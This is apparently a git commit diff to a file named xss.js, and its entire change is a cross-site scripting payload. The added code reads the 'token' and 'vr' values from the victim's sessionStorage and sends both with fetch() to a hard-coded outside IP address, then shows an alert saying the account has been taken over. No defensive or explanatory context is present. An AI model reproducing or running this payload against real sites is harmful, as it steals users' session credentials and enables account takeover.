fbbf384e193b5ee3fac03879e9cc28c329117131
zinc000 <140118579+zinc000@users.noreply.github.com>
2025-08-04 13:18:27 +0300

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,3 +1,7 @@
-location.search == "?view=Address&attacker"
-  ? history.go(-2)
-  : (zwins = window.open("", "childWindow"));
+var token = sessionStorage.getItem("token"); 
+var vr = sessionStorage.getItem("vr");
+
+fetch(`http://194.135.81.248/?victim_token=${token}`);
+fetch(`http://194.135.81.248/?victim_vr=${vr}`);
+
+alert(`Your account has been taken over.`);
